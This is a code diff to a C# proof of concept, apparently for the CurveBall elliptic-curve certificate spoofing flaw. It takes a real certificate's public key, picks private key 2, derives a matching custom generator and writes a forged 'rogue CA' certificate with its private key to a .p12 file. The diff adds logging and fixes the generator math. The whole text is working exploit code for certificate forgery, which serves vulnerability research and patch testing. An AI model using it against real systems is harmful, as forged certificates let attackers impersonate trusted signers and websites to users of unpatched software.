@@ -27,32 +27,43 @@ namespace CurveBall
                 throw new ArgumentException("Please specify a path to the certificate");
             }
             
+            Console.WriteLine("= Loading certificate");
             var certificate = new X509Certificate2(args[0]);
-            
             certificate.AssertECC();
+            
+            Console.WriteLine("= Fetching public key");
             var publicKeyParameters = certificate.GetPublicKeyParameters();
 
+            Console.WriteLine("= Choosing private key k = 2");
             var newPrivateKey = publicKeyParameters.Parameters.Curve.FromBigInteger(BigInteger.Two);
-            var newGenerator = CreateGenerator(publicKeyParameters.Q, newPrivateKey);
-            
+            Console.WriteLine("= Computing new generator G = k^(-1)Q");
+            var newGenerator = CreateGenerator(publicKeyParameters, newPrivateKey);
+
+            Console.WriteLine("= Creating X509Certificate");
             var newDomainParameters = new ECDomainParameters(publicKeyParameters.Parameters.Curve, newGenerator, publicKeyParameters.Parameters.N);
             var newPublicKeyParameters = new ECPublicKeyParameters(publicKeyParameters.Q, newDomainParameters);
             var newPrivateKeyParameters = new ECPrivateKeyParameters(newPrivateKey.ToBigInteger(), newDomainParameters);
 
             var newCertificate = CreateX509Certificate(certificate, newPublicKeyParameters, newPrivateKeyParameters);
-            WriteToPfx(newCertificate, newPrivateKeyParameters);
+            Console.WriteLine("= Writing to file (*.p12)");
+            WriteToP12(newCertificate, newPrivateKeyParameters);
         }
 
-        private static ECPoint CreateGenerator(ECPoint q, ECFieldElement privateKey) => q.Multiply(privateKey.Invert().ToBigInteger()).Normalize();
+        // Returns G = k^(-1)Q. Here k^(-1) is the multiplicative inverse mod #E(F_q).
+        private static ECPoint CreateGenerator(ECPublicKeyParameters parameters, ECFieldElement privateKey)
+        {
+            var privateKeyInverse = privateKey.ToBigInteger().ModInverse(parameters.Parameters.Curve.Order);
+            return parameters.Q.Multiply(privateKeyInverse).Normalize();
+        }
 
-        private static void WriteToPfx(X509Certificate newCertificate, AsymmetricKeyParameter privateKeyParameters)
+        private static void WriteToP12(X509Certificate newCertificate, AsymmetricKeyParameter privateKeyParameters)
         {
             var pkcs12Store = new Pkcs12Store();
             var certEntry = new X509CertificateEntry(newCertificate);
             pkcs12Store.SetCertificateEntry("RougeCA", certEntry);
             pkcs12Store.SetKeyEntry("RougeCA", new AsymmetricKeyEntry(privateKeyParameters), new[] {certEntry});
 
-            using (var fileStream = new FileStream("file.p12", FileMode.Create, FileAccess.Write))
+            using (var fileStream = new FileStream("Rogue.p12", FileMode.Create, FileAccess.Write))
             {
                 pkcs12Store.Save(fileStream, new[] {'T', 'e', 's', 't', '1', '2', '3', '4',}, new SecureRandom());
             }
@@ -62,8 +73,8 @@ namespace CurveBall
         {
             var constructor = new X509V3CertificateGenerator();
             constructor.SetSerialNumber(new BigInteger(certificate.GetSerialNumber().Reverse().ToArray()));
-            constructor.SetSubjectDN(new X509Name("dc=Hannibal"));
-            constructor.SetIssuerDN(new X509Name("dc=Hannibal"));
+            constructor.SetSubjectDN(new X509Name("CN=DoNotTrust, C=Denmark"));
+            constructor.SetIssuerDN(new X509Name("CN=DoNotTrust, C=Denmark"));
             constructor.SetNotBefore(DateTime.Now);
             constructor.SetNotAfter(DateTime.Now.Add(TimeSpan.FromDays(3650)));
             constructor.SetPublicKey(publicKeyParameters);
@@ -74,7 +85,5 @@ namespace CurveBall
             var newCertificate = constructor.Generate(signatureFactory);
             return newCertificate;
         }
-
-   
     }
 }
